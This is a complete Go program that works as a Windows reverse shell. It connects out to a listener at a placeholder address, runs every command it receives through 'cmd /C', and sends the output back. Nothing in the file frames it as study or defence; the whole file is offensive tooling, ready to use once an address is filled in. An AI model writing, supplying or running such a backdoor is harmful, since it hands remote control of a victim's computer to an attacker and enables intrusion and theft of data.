package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

// You will need to replace "IP_ADDRESS:PORT" with your system's IP address and port number
func main() {
	conn, err := net.Dial("tcp", "IP_ADDRESS:PORT")
	if err != nil {
		fmt.Println("[!] Failed to connect to the listener:", err)
		return
	}
	defer conn.Close()

	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("[!] Failed to read from the connection:", err)
			return
		}
		message = strings.TrimSpace(message)

		if message == "exit" {
			break
		}

		cmd := exec.Command("cmd", "/C", message)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("[!] Failed to run the command:", err)
			continue
		}

		conn.Write(output)
	}
}
